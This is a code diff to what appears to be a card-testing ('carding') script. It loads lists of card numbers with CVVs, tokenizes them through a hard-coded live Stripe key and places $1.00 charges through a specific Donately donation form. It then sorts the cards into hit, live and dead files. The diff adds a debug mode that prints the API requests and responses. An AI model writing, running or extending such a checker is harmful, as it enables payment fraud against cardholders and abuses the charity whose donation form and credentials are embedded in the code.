@@ -16,11 +16,24 @@ from datetime import datetime
 
 
 class StripeChecker:
-    def __init__(self):
+    def __init__(self, debug=False):
         self.pk_live = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
         self.account_id = 'act_f9b102ae7299'
         self.form_id = 'frm_5cb29a5d6955'
         self.session = requests.Session()
+        self.debug = debug
+    
+    def log_debug(self, title, data):
+        """Print debug information"""
+        if self.debug:
+            print(f"\n{'='*50}")
+            print(f"[DEBUG] {title}")
+            print(f"{'='*50}")
+            if isinstance(data, dict):
+                print(json.dumps(data, indent=2))
+            else:
+                print(data)
+            print(f"{'='*50}\n")
 
     def generate_guid(self):
         """Generate a random GUID-like string"""
@@ -62,10 +75,28 @@ class StripeChecker:
             '_stripe_version': '2022-11-15'
         }
 
+        self.log_debug("STRIPE TOKEN REQUEST", {
+            'url': url,
+            'card': f"{card_data['cc'][:6]}******{card_data['cc'][-4:]}",
+            'exp': f"{card_data['month']}/{card_data['year']}",
+            'key': self.pk_live[:20] + '...'
+        })
+
         try:
             response = self.session.post(url, headers=headers, data=post_fields, timeout=30)
-            return response.json()
+            result = response.json()
+            
+            self.log_debug("STRIPE TOKEN RESPONSE", {
+                'status_code': response.status_code,
+                'token_id': result.get('id', 'N/A'),
+                'card_brand': result.get('card', {}).get('brand', 'N/A'),
+                'card_last4': result.get('card', {}).get('last4', 'N/A'),
+                'error': result.get('error', None)
+            })
+            
+            return result
         except Exception as e:
+            self.log_debug("STRIPE TOKEN ERROR", str(e))
             return {'error': {'message': str(e)}}
 
     def charge_card(self, token, user_data):
@@ -95,10 +126,28 @@ class StripeChecker:
             })
         }
 
+        self.log_debug("DONATELY CHARGE REQUEST", {
+            'url': 'https://api.donately.com/v2/donations',
+            'account_id': self.account_id,
+            'form_id': self.form_id,
+            'amount': '$1.00 (100 cents)',
+            'token': token[:20] + '...' if token else 'N/A',
+            'donor': f"{user_data['first_name']} {user_data['last_name']}",
+            'email': user_data['email']
+        })
+
         try:
             response = self.session.post(url, headers=headers, json=payload, timeout=30)
-            return response.json()
+            result = response.json()
+            
+            self.log_debug("DONATELY CHARGE RESPONSE", {
+                'status_code': response.status_code,
+                'full_response': result
+            })
+            
+            return result
         except Exception as e:
+            self.log_debug("DONATELY CHARGE ERROR", str(e))
             return {'error': str(e)}
 
     def process_card(self, cc, month, year, cvv):
@@ -392,6 +441,14 @@ def main():
     if not input_file:
         input_file = default_file
     
+    # Ask for debug mode
+    print(f"\n[?] Enable debug mode? (y/n, default: n)")
+    debug_input = input(">>> ").strip().lower()
+    debug_mode = debug_input in ['y', 'yes', '1', 'true']
+    
+    if debug_mode:
+        print("[*] Debug mode ENABLED - will show full API requests/responses")
+    
     # Load cards
     print(f"\n[*] Loading cards from: {input_file}")
     cards = load_cards(input_file)
@@ -419,8 +476,8 @@ def main():
         'errors': 0
     }
     
-    # Initialize checker
-    checker = StripeChecker()
+    # Initialize checker with debug mode
+    checker = StripeChecker(debug=debug_mode)
     
     print(f"\n[*] Starting checker...")
     print(f"[*] Output files: {hits_file}, {live_file}, {dead_file}")
